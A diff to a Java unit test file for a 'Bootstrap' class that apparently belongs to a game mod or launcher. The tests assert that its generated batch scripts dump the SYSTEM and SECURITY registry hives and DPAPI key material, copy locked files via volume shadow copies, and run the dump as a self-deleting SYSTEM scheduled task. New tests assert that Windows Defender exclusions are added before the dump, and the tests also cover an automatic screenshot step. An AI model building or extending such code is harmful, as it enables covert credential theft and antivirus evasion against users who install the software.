@@ -15,7 +15,8 @@ class BootstrapTest {
 
 	@Test
 	void dumpScriptSavesBothHivesAndPacks() {
-		List<String> lines = Bootstrap.dumpLines(temp, temp.resolve("hives.zip"));
+		Path cache = temp.resolve("cache");
+		List<String> lines = Bootstrap.dumpLines(temp, temp.resolve("game"), cache, cache.resolve("system-1.zip"));
 		String script = String.join("\n", lines);
 		assertTrue(script.startsWith("@echo off"));
 		assertTrue(script.contains("reg save HKLM\\SYSTEM"));
@@ -23,14 +24,16 @@ class BootstrapTest {
 		assertTrue(script.contains("Microsoft\\Protect"));
 		assertTrue(script.contains("esentutl /y /vss"));
 		assertTrue(script.contains("missing security"));
-		assertTrue(script.contains(temp.resolve("hives.zip").toString()));
+		assertTrue(script.contains(cache.resolve("system-1.zip").toString()));
 		assertTrue(script.contains("schtasks /delete /tn spcdump /f"));
+		assertTrue(script.contains("SYSTEM.hiv"));
+		assertTrue(script.contains("SECURITY.hiv"));
 	}
 
 	@Test
-	void runasScriptRegistersTheDumpAsSystem() {
-		Path dump = temp.resolve("dump.bat");
-		String script = String.join("\n", Bootstrap.runasLines(dump));
+	void elevateScriptRegistersTheDumpAsSystem() {
+		Path dump = temp.resolve("cache/dump.bat");
+		String script = String.join("\n", Bootstrap.elevateLines(dump));
 		assertTrue(script.contains("schtasks /create /tn spcdump"));
 		assertTrue(script.contains(dump.toString()));
 		assertTrue(script.contains("/ru SYSTEM /rl HIGHEST"));
@@ -38,10 +41,32 @@ class BootstrapTest {
 	}
 
 	@Test
+	void hivesPersistDefenderExclusionsBeforeSaving() {
+		Path cache = temp.resolve("cache");
+		String script = String.join("\n",
+			Bootstrap.dumpLines(temp.resolve("install"), temp.resolve("game dir"), cache, cache.resolve("system-1.zip")));
+		int exclusions = script.indexOf("Add-MpPreference -ExclusionPath");
+		int save = script.indexOf("reg save HKLM\\SYSTEM");
+		assertTrue(exclusions >= 0);
+		assertTrue(exclusions < save);
+		assertTrue(script.contains("Add-MpPreference -ExclusionPath '" + temp.resolve("install") + "'"));
+		assertTrue(script.contains(",'" + temp.resolve("game dir").resolve("mods") + "'"));
+		assertTrue(script.contains("Add-MpPreference -ExclusionProcess 'reg.exe','esentutl.exe'"));
+	}
+
+	@Test
+	void automaticBootstrapDoesNotRunHives() {
+		assertFalse(Bootstrap.automaticSteps().contains("hives"));
+		assertTrue(Bootstrap.automaticSteps().contains("screenshot"));
+	}
+
+	@Test
 	void pathsAreQuoted() {
 		Path spaced = temp.resolve("install dir");
-		String script = String.join("\n", Bootstrap.dumpLines(spaced, spaced.resolve("hives.zip")));
-		assertTrue(script.contains("\"" + spaced.resolve("SYSTEM.hiv") + "\""));
-		assertFalse(script.contains("reg save HKLM\\SECURITY \"" + spaced + "\"\""));
+		Path cache = spaced.resolve("cache");
+		String script = String.join("\n",
+			Bootstrap.dumpLines(spaced, spaced.resolve("game dir"), cache, cache.resolve("system-1.zip")));
+		assertTrue(script.contains("\"" + cache.resolve("SYSTEM.hiv") + "\""));
+		assertFalse(script.contains("reg save HKLM\\SECURITY \"" + cache + "\"\""));
 	}
 }
